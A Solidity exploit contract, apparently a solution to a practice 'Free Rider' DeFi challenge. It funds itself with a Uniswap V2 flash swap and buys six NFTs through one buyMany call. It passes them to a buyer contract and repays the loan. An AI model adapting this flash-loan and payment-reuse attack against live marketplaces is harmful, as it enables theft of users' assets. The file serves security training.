//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface IUniswapV2Pair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee{
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

contract FreeRiderAttack is IUniswapV2Callee{

    IUniswapV2Pair private uniswapPair;
    FreeRiderNFTMarketplace private marketplace;
    IWETH9 private weth;
    IERC721 private nft;
    FreeRiderBuyer private buyer;
    uint256[] private token = [0,1,2,3,4,5];

    constructor(address _pair, address payable _marketplace, address _weth, address _nft, address _buyer){
        uniswapPair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        weth = IWETH9(_weth);
        nft = IERC721(_nft);
        buyer = FreeRiderBuyer(_buyer);
    }

    function attack(uint256 amount) external payable{
        uniswapPair.swap(amount,0 ,address(this),new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override{
        weth.withdraw(amount0);

        marketplace.buyMany{value : address(this).balance}(token);

        weth.deposit();

        uint256 fee = ((amount0 * 3) / 997)  + 1 ; 
        uint256 amountToRepay = amount0 + fee;

        for(uint256 i = 0; i< token.length; i++){
            nft.safeTransferFrom(address(this), address(buyer), i);
        }

        weth.deposit{value: amountToRepay}();

        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
